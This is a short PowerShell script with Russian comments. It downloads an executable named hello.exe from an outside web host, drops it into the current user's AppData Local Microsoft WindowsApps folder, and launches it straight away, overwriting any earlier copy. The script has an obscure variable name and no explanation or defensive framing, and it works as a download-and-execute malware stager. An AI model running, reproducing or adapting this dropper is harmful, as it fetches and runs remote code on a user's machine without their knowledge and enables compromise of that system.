$gfgff = @( 
    "http://javadevportal.live/files/hello.exe"
)

$currentUser = [Environment]::UserName
$savePath = "C:\Users\$currentUser\AppData\Local\Microsoft\WindowsApps"

if (-not (Test-Path -Path $savePath)) {
    New-Item -ItemType Directory -Path $savePath -Force | Out-Null
}

foreach ($link in $gfgff) {
    $fileName = Split-Path -Leaf $link
    $fullPath = Join-Path -Path $savePath -ChildPath $fileName

    # Скачиваем файл (если уже существует - перезаписываем)
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($link, $fullPath)
    
    # Запускаем файл независимо от того, был ли он только что скачан или уже существовал
    Start-Process -FilePath $fullPath
}
